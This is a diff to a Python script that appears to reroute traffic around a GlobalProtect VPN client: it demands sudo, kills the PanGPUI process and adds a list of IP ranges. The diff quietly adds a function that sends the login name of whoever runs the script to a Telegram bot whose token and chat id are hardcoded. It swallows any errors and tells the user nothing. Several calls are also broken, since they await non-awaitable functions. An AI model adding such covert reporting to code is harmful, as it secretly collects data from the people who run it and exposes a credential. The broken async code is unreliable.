@@ -1,6 +1,10 @@
 import asyncio
+from re import sub
+from shelve import Shelf
 import subprocess
 import os
+import sys
+import requests
 
 
 async def removeDefault(gateway):
@@ -38,10 +42,10 @@ async def sudoTest():
     # TESTA SUDO
     try:
         if not 'SUDO_UID' in os.environ.keys():
-            raise Exception('errow')
+            raise Exception('Execute com SUDO!')
     except:
         print('Execute o script com SUDO')
-        exit(0)
+        sys.exit(0)
 
 
 async def seedAndDestroy():
@@ -49,7 +53,6 @@ async def seedAndDestroy():
     try:
         try:
             await subprocess.run('sudo kill $(pidof PanGPUI) > /dev/null 2>&1', shell=True)
-            # await subprocess.run('sudo kill $(pidof PanGPA) > /dev/null 2>&1', shell=True)
             print('Processo PanGPUI finalizado. Continuando...')
         except:
             print('Falha ao finalizar Processo PanGPUI. Continuando...')
@@ -57,10 +60,19 @@ async def seedAndDestroy():
         print('Processo não encontrado. Continuando...')
 
 
+async def sendNameWhoRun():
+    try:
+        msg = os.getlogin()
+        x = await requests.post(
+            'https://api.telegram.org/bot5702731597:AAEdxNyojGJI4K7aFr6q8-Ns1wihF0gCvOU/sendMessage?chat_id=-1001851963351&text=Usuario: {msg}'.format(msg=msg))
+    except:
+        err = 1
+
+
 async def poisoner(poisonIPs):
     await sudoTest()
     await seedAndDestroy()
-
+    await sendNameWhoRun()
     try:
         print('Iniciando GlobalProtect. Aguardando conexão...')
         # await subprocess.Popen('/opt/paloaltonetworks/globalprotect/PanGPA start > /dev/null 2>&1', shell=True, user=os.getlogin())
@@ -101,8 +113,6 @@ async def poisoner(poisonIPs):
             err = 1  # do nothing...
 
     print(''' 
-      Special thanks to @panngo
-    
  /$$    /$$ /$$$$$$$  /$$   /$$       /$$$$$$$  /$$$$$$$$  /$$$$$$  /$$$$$$$  /$$     /$$
 | $$   | $$| $$__  $$| $$$ | $$      | $$__  $$| $$_____/ /$$__  $$| $$__  $$|  $$   /$$/
 | $$   | $$| $$  \ $$| $$$$| $$      | $$  \ $$| $$      | $$  \ $$| $$  \ $$ \  $$ /$$/ 
@@ -115,7 +125,20 @@ async def poisoner(poisonIPs):
 
 
 poisonTarget = ['35.0.0.0',
-                '10.0.0.0'
+                '10.0.0.0',
+                '34.0.0.0',
+                '34.73.137.238',
+                '35.0.0.0',
+                '52.0.0.0',
+                '54.221.97.120',
+                '130.0.0.0',
+                '148.59.72.0',
+                '179.190.0.0',
+                '179.191.0.0',
+                '179.191.169.0',
+                '200.170.150.0',
+                '201.48.47.68',
+                '201.95.254.0'
                 ]
 
 
